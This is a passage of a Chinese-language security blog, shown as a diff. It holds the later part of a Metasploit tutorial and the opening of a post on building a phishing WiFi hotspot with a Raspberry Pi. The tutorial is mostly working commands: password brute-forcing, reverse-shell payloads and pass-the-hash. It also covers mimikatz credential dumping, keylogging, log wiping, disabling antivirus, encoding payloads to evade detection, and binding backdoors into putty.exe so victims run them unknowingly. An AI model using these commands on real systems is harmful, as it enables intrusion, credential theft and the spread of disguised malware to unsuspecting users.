+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping //测试MSSQL的存在和信息</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.2.1-255</span><br><span class="line">set threads 30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对扫描到的IP进行爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_login </span><br><span class="line">show options </span><br><span class="line">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt </span><br><span class="line">set RHOSTS 192.168.1.130 </span><br><span class="line">set THREADS 10 </span><br><span class="line">set verbose false </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>sa权限对其利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin/mssql/mssql_exec</span><br><span class="line">set rhost 192.168.2.10</span><br><span class="line">set password sa</span><br><span class="line">set CMD cmd.exe /c echo hello</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+<ol>
+<li>使用MSSQL自带的 <code>xp_cmdshell</code> 添加账户<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit/windows/mssql/mssql_payload </span><br><span class="line">show options </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.1.111 </span><br><span class="line">set LPORT 433 </span><br><span class="line">set RHOST 192.168.1.130 </span><br><span class="line">set PASSWORD password130 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li><p>MySQL开放利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">待完善</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>爆破ssh模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set rhosts 7.7.7.20</span><br><span class="line">set username root</span><br><span class="line">set pass_file /root/pass.txt //加载字典，可以收集密码做字典</span><br><span class="line">set threads 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过nmap扫描基本漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap –script=vuln 受害靶机ip地址</span><br><span class="line">msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>###清除痕迹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。</span><br></pre></td></tr></table></figure>
+<h3 id="读取系统账号密码"><a href="#读取系统账号密码" class="headerlink" title="读取系统账号密码"></a>读取系统账号密码</h3><ul>
+<li><p>加载mimikatz</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz //加载mimikatz模块</span><br><span class="line">meterpreter &gt; wdigest //需要system权限</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>读取Hash并使用smb协议登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; use priv </span><br><span class="line">meterpreter&gt; run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure>
+<p>当获取到密码的hash 之后无法破解出明文密码且无法直接使用hash 登陆，需要使用 <code>pass-the-hash</code> 技术： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use windows/smb/psexec </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.1.111 </span><br><span class="line">set LPORT 443 </span><br><span class="line">set RHOST 192.168.1.130 </span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：<br>在目标机器上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker p@ssw0rd /add</span><br></pre></td></tr></table></figure>
+<p>本地生成一个后门程序： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=443 X &gt; payload.exe</span><br></pre></td></tr></table></figure>
+<p>将payload.exe 拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp </span><br><span class="line">LHOST=192.168.1.111 LPORT=443 </span><br><span class="line">use priv </span><br><span class="line">getsystem </span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+<p>至此取得SYSTEM 权限</p>
+</li>
+</ul>
+<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/capture/keylog_recorder //运行键盘记录模块，他自己创建本文。</span><br></pre></td></tr></table></figure>
+<p>/root/.msf3/loot/*.txt #查看结果 </p>
+<h3 id="进程权限迁移"><a href="#进程权限迁移" class="headerlink" title="进程权限迁移"></a>进程权限迁移</h3><p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp 进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
+<p>在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。</p>
+<h3 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run killav （这个脚本要小心使用，可能导致目标机器蓝屏死机。）</span><br></pre></td></tr></table></figure>
+<h3 id="获取系统流量"><a href="#获取系统流量" class="headerlink" title="获取系统流量"></a>获取系统流量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run packtrecorder –i 1</span><br></pre></td></tr></table></figure>
+<h3 id="获取目标网络共享"><a href="#获取目标网络共享" class="headerlink" title="获取目标网络共享"></a>获取目标网络共享</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run scraper</span><br></pre></td></tr></table></figure>
+<p>从目标主机获得所有网络共享等信息。并且获得的这些所有这些信息都存储在 <code>/root/.msf4/logs/scripts/scraper/directory</code> 目录下。使用 <code>ls</code> 命令查看存储的这些文件。</p>
+<h3 id="VNC远程界面控制"><a href="#VNC远程界面控制" class="headerlink" title="VNC远程界面控制"></a>VNC远程界面控制</h3><ul>
+<li>VNC控制命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run vnc </span><br><span class="line">meterpreter&gt; run screen_unlock</span><br></pre></td></tr></table></figure>
+<h3 id="Windows-API编程-Hello-World弹窗"><a href="#Windows-API编程-Hello-World弹窗" class="headerlink" title="Windows API编程 , Hello World弹窗"></a>Windows API编程 , Hello World弹窗</h3><p>使用Railgun 操作windows APIs </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">[*] Starting IRB shell</span><br><span class="line">[*] The &apos;client&apos; variable holds the meterpreter client</span><br><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;Hello World&quot;,&quot;Im Title&quot;,&quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="编码绕过杀软"><a href="#编码绕过杀软" class="headerlink" title="编码绕过杀软"></a>编码绕过杀软</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfencode –l #列出可用编码器</span><br></pre></td></tr></table></figure>
+<p>简单编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe</span><br></pre></td></tr></table></figure>
+<p>使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。</p>
+<p>多次编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | </span><br><span class="line">msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw | </span><br><span class="line">msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o </span><br><span class="line">/var/www/payload3.exe</span><br></pre></td></tr></table></figure>
+<p>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。 </p>
+<blockquote>
+<p>题外：</p>
+<p>经测试 &gt;&gt;&gt; </p>
+<p>1：使用此命令生成的后门也被MSE 杀到；</p>
+<p>2：未编码的后门或编码次数较少的后门可以直接被秒杀；</p>
+<p>3：windows/x64/meterpreter/reverse_tcp 生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；</p>
+<p>4：x86 编码器编码的后门在64 位机器上无法执行；</p>
+<p>5：360 有个沙箱功能，后门文件右键选择“在360 隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p>
+</blockquote>
+<h3 id="自定义可执行程序模板"><a href="#自定义可执行程序模板" class="headerlink" title="自定义可执行程序模板"></a>自定义可执行程序模板</h3><p>msfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同<br>平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget &lt;http://download.sysinternals.com/Files/ProcessExplorer.zip&gt; </span><br><span class="line">cd work </span><br><span class="line">unzip ProcessExplorer.zip </span><br><span class="line">cd .. </span><br><span class="line">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode </span><br><span class="line">–t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5</span><br></pre></td></tr></table></figure>
+<p>在目标机器上运行，然后本地使用msfcli 监听端口等待反弹连接： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 </span><br><span class="line">LPORT=8080 E</span><br></pre></td></tr></table></figure>
+<h3 id="暗度陈仓—猥琐执行payload-绑定到可执行文件"><a href="#暗度陈仓—猥琐执行payload-绑定到可执行文件" class="headerlink" title="暗度陈仓—猥琐执行payload (绑定到可执行文件)"></a>暗度陈仓—猥琐执行payload (绑定到可执行文件)</h3><p>绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode </span><br><span class="line">–t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</span><br></pre></td></tr></table></figure>
+<p>假如选择一个GUI 界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd 窗口，-k 选项的作用是payload 独立于模板软件的进程运行。</p>
+<h3 id="MetaSploit-创建工作空间"><a href="#MetaSploit-创建工作空间" class="headerlink" title="MetaSploit 创建工作空间"></a>MetaSploit 创建工作空间</h3><p>很多时候，你要在不同的环境下，渗透不同的目标，这个时候 hosts中的IP会很乱，你就需要工作空间来区分开你每次不同的渗透环境中的操作与存储，来说说Metasploit中的 <code>workspace</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -h</span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace</span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace</span><br><span class="line">    workspace -h               Show this help information</span><br></pre></td></tr></table></figure>
+<p>比较常用的命令：</p>
+<p>添加工作空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a imworkspaceone</span><br><span class="line">[*] Added imworkspaceone</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure>
+<p>选择工作空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace imworkspaceone </span><br><span class="line">[*] Workspace: imworkspaceone</span><br></pre></td></tr></table></figure>
+<p>删除工作空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -d imworkspaceone</span><br><span class="line">[*] Deleted workspace: imworkspaceone</span><br><span class="line">[*] Switched workspace: default</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure>
+<p>操作多个工作空间来分离渗透操作与数据。</p>
+<h3 id="使用-Hosts-中的IP定向渗透"><a href="#使用-Hosts-中的IP定向渗透" class="headerlink" title="使用 Hosts 中的IP定向渗透"></a>使用 Hosts 中的IP定向渗透</h3><p>当你选择好了你的攻击模块的时候 ，想要将 <code>RHOSTS</code> 中的IP列表设置为<code>Hosts</code>中的IP（这里你需要Hosts中有IP才行，可以选中用 <code>db_import</code> 导入，也可以用 <code>db_nmap</code> 扫描获取）</p>
+<p>首先配置你的攻击模块，然后 <code>show options</code> 查看需要配置目标的配置项是RHOSTS还是RHOST，当需要设置RHOSTS的时候 <code>hosts -c address -R</code> 就将hosts中所有IP地址的列表传送给了RHOSTS，执行run 向metasploit发送执行命令。</p>
+<p>以下是一个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   CONCURRENCY  10               yes       The number of concurrent ports to check per host</span><br><span class="line">   DELAY        0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS                        yes       The target address range or CIDR identifier</span><br><span class="line">   THREADS      1                yes       The number of concurrent threads</span><br><span class="line">   TIMEOUT      1000             yes       The socket connect timeout in milliseconds</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; hosts -c address -R</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address</span><br><span class="line">-------</span><br><span class="line">10.12.103.171</span><br><span class="line">10.12.103.172</span><br><span class="line">10.12.103.173</span><br><span class="line">10.12.103.174</span><br><span class="line">10.12.103.191</span><br><span class="line">10.12.103.192</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">10.14.80.212</span><br><span class="line">10.14.80.213</span><br><span class="line">10.14.80.214</span><br><span class="line">10.14.80.215</span><br><span class="line">10.14.80.216</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; file:/var/folders/0n/78ntbx595w3fll8tn5gk4t3c0000gn/T/msf-db-rhosts-20180412-7048-17nfta1</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:22 - TCP OPEN</span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:80 - TCP OPEN</span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:111 - TCP OPEN</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h2 id="常用渗透手段"><a href="#常用渗透手段" class="headerlink" title="常用渗透手段"></a>常用渗透手段</h2><h3 id="扫描匿名FTP"><a href="#扫描匿名FTP" class="headerlink" title="扫描匿名FTP"></a>扫描匿名FTP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/anonymos </span><br><span class="line">set RHOSTS 192.168.1.0/24 </span><br><span class="line">set THREADS 50 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="与nessus-结合扫描"><a href="#与nessus-结合扫描" class="headerlink" title="与nessus 结合扫描"></a>与nessus 结合扫描</h3><p>使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1/msf </span><br><span class="line">db_import /tmp/nessus_report_Host_test.nessus </span><br><span class="line">db_hosts –c address,svcs,vulns </span><br><span class="line">db_vulns</span><br></pre></td></tr></table></figure>
+<p>在MSF 中使用Nessus： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1/msf </span><br><span class="line">load nessus </span><br><span class="line">nessus_connect nessus:toor@192.168.1.111:8834 ok </span><br><span class="line">nessus_policy_list #查看存在的扫描规则 </span><br><span class="line">nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称 </span><br><span class="line">nessus_scan_status #查看扫描进行状态 </span><br><span class="line">nessus_report_list #查看扫描结果 </span><br><span class="line">nessus_report_get skjla243-3b5d-* #导入报告 </span><br><span class="line">db_hosts –c address,svcs,vulns</span><br></pre></td></tr></table></figure>
+<h3 id="SMB弱口令扫描"><a href="#SMB弱口令扫描" class="headerlink" title="SMB弱口令扫描"></a>SMB弱口令扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/smb/smb_login </span><br><span class="line">set RHOSTS 192.168.1.111-222 </span><br><span class="line">set SMBUser Administrator </span><br><span class="line">set SMBPass admin </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="VNC空口令扫描"><a href="#VNC空口令扫描" class="headerlink" title="VNC空口令扫描"></a>VNC空口令扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth </span><br><span class="line">set RHOSTS 192.168.1.111 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="Open-X11空口令"><a href="#Open-X11空口令" class="headerlink" title="Open X11空口令"></a>Open X11空口令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/x11/open_x11 </span><br><span class="line">set RHOST 192.168.1.0/24 </span><br><span class="line">set THREADS 50 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="Msf自动化测试-一行命令执行"><a href="#Msf自动化测试-一行命令执行" class="headerlink" title="Msf自动化测试(一行命令执行)"></a>Msf自动化测试(一行命令执行)</h3><p>为了缩短渗透测试的时间可以将 <code>Msf</code> 命令写入一个文件，然后使用 <code>msfconsole</code> 加载执行。</p>
+<p>加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项 </p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo ‘version’ &gt; resource.rc </span><br><span class="line">echo ‘load sounds’ &gt;&gt; resource.rc </span><br><span class="line">msfconsole –r resource.rc</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo ‘use exploit/windows/smb/ms08_067_netapi’ &gt; autoexp.rc </span><br><span class="line">echo ‘set RHOST 192.168.1.133’ &gt;&gt; autoexp.rc </span><br><span class="line">echo ‘set PAYLOAD windows/meterpreter/reverse_tcp’ &gt;&gt; autoexp.rc </span><br><span class="line">echo ‘set LHOST 192.168.1.111’ &gt;&gt; autoexp.rc </span><br><span class="line">echo ‘exploit’ &gt;&gt; autoexp.rc </span><br><span class="line">msfconsole </span><br><span class="line">msf&gt; resource autoexp.rc</span><br></pre></td></tr></table></figure>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          使用树莓派开启热点，让所有连接上的客户端流量经过树莓派，劫持中间流量，实施中间人攻击。
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/02/23/树莓派创建钓鱼WiFi实战全过程/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/02/23/树莓派创建钓鱼WiFi实战全过程/">
+                树莓派创建钓鱼WiFi实战全过程
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-02-23</span>
+            
+            
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/02/22/MacOS安装Metasploit全攻略/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/02/22/MacOS安装Metasploit全攻略/" itemprop="url">MacOS安装Metasploit全攻略</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-22T11:08:24+08:00">2018-02-22</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="categories/MetaSploit教程/" itemprop="url" rel="index"><span itemprop="name">MetaSploit教程</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul>
+<li><p>攻击机：树莓派3代 B   <code>kali 2.0 armhf</code></p>
+<ul>
+<li>免驱无线网卡</li>
+</ul>
+</li>
+<li><p>受害机：MacBook  <code>MacOS Sierra 10.12.6</code></p>
+<p>​</p>
+</li>
+</ul>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>####安装必要工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install hostapd dnsmasq</span><br></pre></td></tr></table></figure>
+<p>安装 <code>nodejs</code> , 你可以直接执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>当安装上面命令安装失败时尝试下面方法：</p>
+<p>访问 <a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">官方下载页面</a> ，找到Source Code源码包<a href="https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz" target="_blank" rel="noopener">下载地址</a></p>
